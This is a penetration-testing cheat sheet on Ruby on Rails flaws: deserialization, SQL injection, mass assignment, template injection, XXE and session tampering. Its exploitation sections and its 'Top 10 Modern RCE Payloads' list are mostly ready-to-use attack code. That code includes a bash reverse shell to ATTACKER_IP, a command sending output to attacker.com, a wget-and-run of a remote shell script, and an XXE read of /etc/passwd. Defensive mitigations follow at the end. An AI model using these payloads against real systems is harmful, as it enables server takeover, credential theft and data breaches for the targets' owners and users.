## 1. Overview

Ruby on Rails (RoR) is a popular web application framework that has faced several critical vulnerabilities over the years. Understanding these vulnerabilities is essential for identifying security flaws in Rails applications during penetration testing.

**Key Vulnerability Categories:**

- Remote Code Execution (RCE)
- SQL Injection
- Mass Assignment
- YAML Deserialization
- XML External Entity (XXE)
- Session manipulation
- Template injection

---

## 2. Exploitation Methods

### 2.1 YAML Deserialization RCE (CVE-2013-0156)

**Affects:** Rails < 3.2.11, < 3.1.10, < 3.0.19

**How it works:** Rails automatically deserializes YAML/XML data in requests. Malicious YAML can execute arbitrary code.

**Steps:**

1. Identify Rails version (check headers, error pages, or `/rails/info/properties`)
2. Send POST request with `Content-Type: application/xml` or `text/yaml`
3. Include malicious YAML payload in request body

**Check command:**

```bash
curl -X POST http://target.com/endpoint \
  -H "Content-Type: application/xml" \
  -d "<?xml version='1.0'?><hash><foo type='yaml'>--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n    specs:\n      !ruby/object:Gem::Source\n        current_specs: !!null\n</foo></hash>"
```

---

### 2.2 SQL Injection via ActiveRecord

**Vulnerable patterns:**

- Direct string interpolation in `where()` clauses
- Unsafe use of `find_by_sql()`
- Unsanitized ORDER BY clauses

**Steps:**

1. Identify endpoints accepting search/filter/sort parameters
2. Test with SQL metacharacters: `'`, `"`, `--`, `;`
3. Exploit using parameter pollution or array tricks

**Example vulnerable code:**

```ruby
User.where("name = '#{params[:name]}'")
```

**Exploitation:**

```bash
# Basic test
GET /users?name=admin' OR '1'='1

# Array-based injection (CVE-2012-2661)
GET /users?id[]=1&id[]=2) OR 1=1--
```

---

### 2.3 Mass Assignment (CVE-2012-2660, CVE-2012-2694)

**Affects:** Rails < 3.2.3

**How it works:** Attacker can inject unexpected parameters to modify sensitive model attributes.

**Steps:**

1. Identify POST/PUT/PATCH endpoints
2. Add unexpected parameters (e.g., `admin=true`, `role=admin`)
3. Check if privilege escalation occurred

**Example payload:**

```bash
POST /users HTTP/1.1
Content-Type: application/json

{
  "user": {
    "username": "newuser",
    "password": "pass123",
    "admin": true,
    "role": "admin"
  }
}
```

---

### 2.4 Template Injection (ERB/HAML)

**How it works:** User input rendered directly in templates without proper escaping.

**Steps:**

1. Identify reflection points (error pages, emails, views)
2. Test with template syntax: `<%= 7*7 %>`, `#{7*7}`
3. Escalate to RCE

**Payloads:**

```ruby
<%= `whoami` %>
<%= system('id') %>
<%= IO.popen('ls').readlines %>
<%= `cat /etc/passwd` %>
```

---

### 2.5 XXE (XML External Entity)

**Affects:** Rails apps parsing XML without proper configuration

**Steps:**

1. Find endpoints accepting XML (`Content-Type: application/xml`)
2. Send XXE payload
3. Read local files or trigger SSRF

**Basic XXE payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<hash>
  <test>&xxe;</test>
</hash>
```

---

### 2.6 Session Cookie Manipulation

**How it works:** Older Rails versions used Marshal serialization for sessions, allowing RCE through cookie tampering.

**Steps:**

1. Capture session cookie
2. Decode Base64
3. Craft malicious Marshal payload
4. Re-encode and replace cookie

---

## 3. Bypasses

### 3.1 Strong Parameters Bypass

**Technique:** Nested parameters and type confusion

```ruby
# Instead of:
{"user": {"admin": true}}

# Try:
{"user": {"admin": {"value": true}}}
```

---

### 3.2 SQL Injection Filter Bypass

**Using arrays:**

```bash
?id[]=1) OR 1=1--
?order[]=name--
```

**Using hashes:**

```bash
?where[name]=admin' OR '1'='1
```

---

### 3.3 CSRF Token Bypass

**Techniques:**

- Check if token validation is disabled on API endpoints
- Test with `null` or empty token
- Try different HTTP methods (GET instead of POST)
- Check if CORS allows arbitrary origins

```bash
# Test without token
curl -X POST http://target.com/admin/delete -d "id=5"

# Test with null
curl -X POST http://target.com/admin/delete \
  -d "id=5&authenticity_token=null"
```

---

## 4. Payloads

### Top 10 Modern RCE Payloads

**1. Kernel.exec RCE:**

```ruby
<%= Kernel.exec('curl http://attacker.com/?data=$(whoami)') %>
```

**2. System command:**

```ruby
<%= system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"') %>
```

**3. Backticks:**

```ruby
<%= `wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh` %>
```

**4. IO.popen:**

```ruby
<%= IO.popen('id').read %>
```

**5. Open3.capture2:**

```ruby
<%= require 'open3'; Open3.capture2('whoami')[0] %>
```

**6. YAML deserialization (pre-3.2.11):**

```yaml
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
    specs:
      !ruby/object:Gem::Source
        current_specs: !!null
```

**7. Marshal deserialization:**

```ruby
Marshal.load(Base64.decode64("BAhvOh..."))
```

**8. Eval injection:**

```ruby
<%= eval("system('id')") %>
```

**9. ActiveSupport::JSON RCE (CVE-2013-0333):**

```json
[{"json_class":"Gem::Requirement","requirements":[["!ruby/object:Gem::DependencyList","specs"]]}]
```

**10. Ruby 2.x universal RCE:**

```ruby
<%= require 'open3'; Open3.popen3('id') {|i,o,e,t| o.read} %>
```

---

## 5. Higher Impact Scenarios

### 5.1 Privilege Escalation via Mass Assignment

- Modify `role`, `admin`, `is_admin`, `permissions` attributes
- Escalate from regular user to admin
- **Impact:** Full application compromise

---

### 5.2 RCE to Server Takeover

- Execute reverse shell
- Read database credentials from `config/database.yml`
- Read secrets from `config/secrets.yml` or ENV
- Pivot to internal network
- **Impact:** Complete infrastructure compromise

---

### 5.3 SQL Injection to Data Exfiltration

- Dump entire database using UNION-based injection
- Extract user credentials, API keys, tokens
- Access sensitive business data
- **Impact:** Data breach, compliance violations

---

### 5.4 XXE to SSRF

- Use XXE to scan internal network
- Access cloud metadata endpoints (`169.254.169.254`)
- Steal AWS credentials, Azure tokens
- **Impact:** Cloud account takeover

---

### 5.5 Template Injection to File Read/Write

- Read source code, config files
- Write webshell to public directory
- Modify application code
- **Impact:** Persistent backdoor access

---

## 6. Mitigations

### 6.1 Keep Rails Updated

```bash
# Check current version
rails -v

# Update Rails
bundle update rails
```

---

### 6.2 Use Strong Parameters

```ruby
# In controllers
def user_params
  params.require(:user).permit(:username, :email, :password)
end
```

---

### 6.3 Parameterized Queries

```ruby
# SAFE
User.where("name = ?", params[:name])
User.where(name: params[:name])

# UNSAFE
User.where("name = '#{params[:name]}'")
```

---

### 6.4 Disable XML/YAML Parsing

```ruby
# In config/application.rb
config.middleware.delete ActionDispatch::ParamsParser
```

---

### 6.5 Content Security Policy

```ruby
# In config/initializers/content_security_policy.rb
Rails.application.config.content_security_policy do |policy|
  policy.default_src :self
  policy.script_src :self
end
```

---

### 6.6 Use Brakeman for Static Analysis

```bash
gem install brakeman
brakeman /path/to/rails/app
brakeman -o report.html
```

---

### 6.7 Secure Session Configuration

```ruby
# In config/initializers/session_store.rb
Rails.application.config.session_store :cookie_store, 
  key: '_app_session',
  secure: true,      # HTTPS only
  httponly: true,    # No JS access
  same_site: :lax    # CSRF protection
```

---

### 6.8 Input Validation & Sanitization

```ruby
# Use Rails sanitizers
include ActionView::Helpers::SanitizeHelper

sanitized = sanitize(params[:content])
stripped = strip_tags(params[:input])
```

---

### 6.9 Disable Unnecessary Routes

```ruby
# In config/routes.rb
Rails.application.routes.draw do
  # Remove /rails/info routes in production
end
```

---

### 6.10 Regular Security Audits

- Run Brakeman in CI/CD pipeline
- Monitor CVE databases for Rails vulnerabilities
- Review dependencies with `bundle audit`
- Perform penetration testing

```bash
gem install bundler-audit
bundle audit check --update
```

---

## Testing Tools

**Brakeman (Static Analysis):**

```bash
gem install brakeman
brakeman /path/to/rails/application
```

**Additional Resources:**

- https://github.com/presidentbeef/brakeman
- https://bishopfox.com/blog/ruby-vulnerabilities-exploits
- https://guides.rubyonrails.org/security.html